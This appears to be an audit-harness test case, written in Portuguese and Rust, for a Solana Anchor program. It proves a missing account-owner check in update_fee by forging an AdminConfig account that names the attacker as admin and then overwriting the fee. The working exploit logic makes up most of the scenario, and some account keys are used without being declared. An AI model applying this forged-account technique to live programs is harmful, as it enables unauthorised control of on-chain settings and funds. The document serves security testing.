{
  "plan": "Preparamos uma conta `config` legítima com dono do programa e admin = authority, e uma conta forjada pelo atacante com dono diferente (System Program) cujos bytes 8..40 contêm a pubkey do atacante. O baseline chama `update_fee` com a conta legítima e a authority correta, provando que o cenário está montado. O ataque chama `update_fee` com a conta forjada e o atacante como signer; como não há checagem de owner, a comparação passa e o campo fee (bytes 40..48) da conta forjada é sobrescrito. O efeito mede que a conta forjada, com dono diferente do programa, foi aceita e teve seu fee alterado para o valor do ataque.",
  "scenario": "let program_id = env.program_id;
let attacker = Pubkey::new_unique();
let legit_admin = Pubkey::new_unique();

// Conta config legítima: dono do programa, admin = legit_admin, fee inicial 100
let mut legit_data = vec![0u8; 48];
legit_data[0..8].copy_from_slice(&anchor_account_discriminator("AdminConfig"));
legit_data[8..40].copy_from_slice(legit_admin.as_ref());
legit_data[40..48].copy_from_slice(&100u64.to_le_bytes());
let legit_config = account(&program_id, &legit_data, None);

// Conta forjada: dono System Program, admin = attacker, fee inicial 100
let mut forged_data = vec![0u8; 48];
forged_data[0..8].copy_from_slice(&anchor_account_discriminator("AdminConfig"));
forged_data[8..40].copy_from_slice(attacker.as_ref());
forged_data[40..48].copy_from_slice(&100u64.to_le_bytes());
let forged_config = account(&solana_sdk::system_program::ID, &forged_data, None);

// Baseline: uso legítimo com a conta correta e admin correto
let ix_legit = env.anchor_ix(
    "update_fee",
    &(200u64,),
    vec![
        AccountMeta::new(legit_config_key, false),
        AccountMeta::new_readonly(legit_admin, true),
    ],
);
let contas_legit = vec![
    (legit_config_key, legit_config.clone()),
    (legit_admin, wallet(1_000_000_000)),
];
let r_base = env.baseline("update_fee legitimo", &ix_legit, &contas_legit);

// Ataque: conta forjada com dono diferente, admin = attacker
let ix_attack = env.anchor_ix(
    "update_fee",
    &(999u64,),
    vec![
        AccountMeta::new(forged_config_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let contas_attack = vec![
    (forged_config_key, forged_config.clone()),
    (attacker, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com conta forjada", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let after_forged = after(&r, &forged_config_key);
    env.effect(
        "conta forjada (dono != programa) aceita e fee sobrescrito",
        after_forged.owner() != &program_id
            && read_u64(after_forged.data(), 40) == 999u64,
    );
}"
}

